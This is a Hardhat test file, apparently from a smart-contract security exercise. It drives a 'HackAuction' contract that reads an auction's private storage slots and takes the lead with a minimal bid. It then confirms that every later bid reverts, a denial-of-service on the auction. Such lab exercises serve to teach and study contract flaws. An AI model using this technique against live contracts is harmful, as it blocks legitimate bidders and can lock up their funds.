const { assert, expect } = require("chai")
const { network, deployments, ethers } = require("hardhat")
const { developmentChains } = require("../../utils/_networks")
const { BigNumber } = require("ethers")
const { constants } = require("@openzeppelin/test-helpers")

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("HackAuction unit tests", function () {
          let auction, auctionAlice, auctionBob

          beforeEach(async () => {
              // Get the accounts
              accounts = await ethers.getSigners()
              deployer = accounts[0]
              Alice = accounts[1]
              Bob = accounts[2]
              // Deploy contracts
              await deployments.fixture(["section3"])
              auction = await ethers.getContract("Auction", deployer)
              hackAuction = await ethers.getContract("HackAuction", deployer)
              // Connect the users
              auctionDeployer = auction.connect(deployer)
              auctionAlice = auction.connect(Alice)
              auctionBob = auction.connect(Bob)
          })

          it("Should make the hack", async function () {
              /*
            + I check for the initials values of currentLeader and highestBid, as they are private
            * variables, I can not acces directly by the view function as they were public, but I
            * can acces the variables stores at memory slots. currentLeader is an address so it ocupies
            * the complete slot at position 0. highestBid is an uint256 so it also ocupies a complete
            * memory slot, in this case the slot at position 1. I access to them in this case using
            * ethers.js with the property getStorageAt
            */

              // Take the currentLeader this initial value should be the address zero
              const currentLeader =
                  "0x" + (await ethers.provider.getStorageAt(auction.address, 0)).slice(26)
              // Take the currentHighestBid, this initial value should be 0
              const currentHighestBid = await ethers.provider.getStorageAt(auction.address, 1)
              // I´ll make a bid with just 1 unit above of the current highest
              const amountToHack = BigNumber.from(
                  await ethers.provider.getStorageAt(auction.address, 1)
              ).add(BigNumber.from("1"))

              // On the Hack contract call the function hackBid with the target contract address
              // and send ethers equal to the amountToHack
              await hackAuction.hackBid(auction.address, { value: amountToHack })

              // Take the new leader, this should be the hackAuction contract, as the getStorageAt
              // does not return the address, I slice the result to the address length
              const newLeader =
                  "0x" + (await ethers.provider.getStorageAt(auction.address, 0)).slice(26)
              // Take the new highest bid
              const newHighestBid = await ethers.provider.getStorageAt(auction.address, 1)

              /*
               * I check:
               * The initial leader is the address zero
               * The newLeader is the hack contract
               * The new highest bid is bigger than the initial
               * The new highest bid is equals to the amountBid
               */
              assert.equal(currentLeader, constants.ZERO_ADDRESS)
              assert.equal(newLeader, hackAuction.address.toLowerCase())
              assert(newHighestBid.toString() > currentHighestBid.toString())
              assert.equal(amountToHack.toString(), BigNumber.from(newHighestBid).toString())
          })

          it("Should avoid someone else to become the newLeader", async function () {
              // First I check that the Auction contract does not revert before the hack
              await expect(auctionAlice.bid({ value: "1" })).not.to.be.reverted
              await expect(auctionBob.bid({ value: "2" })).not.to.be.reverted

              // Then I hack the contract the same way the last test
              const amountToHack = BigNumber.from(
                  await ethers.provider.getStorageAt(auction.address, 1)
              ).add(BigNumber.from("1"))

              await hackAuction.hackBid(auction.address, { value: amountToHack })

              // Last I check that when someone try to become a new leader on the Auction
              // contract after the hack

              const amountToBid = BigNumber.from(amountToHack).add(BigNumber.from("1"))

              await expect(auctionAlice.bid({ value: amountToBid })).to.be.reverted
          })
      })
